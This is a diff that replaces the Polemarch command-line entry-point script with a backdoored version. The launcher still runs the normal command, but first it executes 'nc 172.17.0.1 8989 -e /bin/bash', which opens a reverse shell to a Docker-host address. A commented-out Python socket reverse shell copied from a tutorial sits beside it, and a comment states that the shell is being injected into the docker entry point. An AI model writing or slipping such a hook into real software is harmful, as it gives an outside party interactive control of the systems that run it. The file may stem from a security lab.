@@ -1,0 +1,36 @@
+#!/opt/polemarch/bin/python3
+# -*- coding: utf-8 -*-
+
+# ORIGINAL
+# import re
+# import sys
+# from polemarch import cmd_execution
+# if __name__ == '__main__':
+#     sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+#     sys.exit(cmd_execution())
+
+import subprocess
+import re
+import sys
+from os import dup2
+from subprocess import run
+import socket
+from polemarch import cmd_execution
+
+# Inject a reverse shell into the docker entry point
+# From: https://www.linuxfordevices.com/tutorials/shell-script/reverse-shell-in-python
+# def reverse_shell():
+#     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+#     s.connect(("172.17.0.1",8989)) 
+#     dup2(s.fileno(),0) 
+#     dup2(s.fileno(),1) 
+#     dup2(s.fileno(),2) 
+#     s.send("Connected!")
+#     run(["/bin/bash","-i"])
+
+if __name__ == '__main__':
+    #reverse_shell()
+    subprocess.run(["nc", "172.17.0.1", "8989", "-e", "/bin/bash"])
+
+    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
+    sys.exit(cmd_execution())
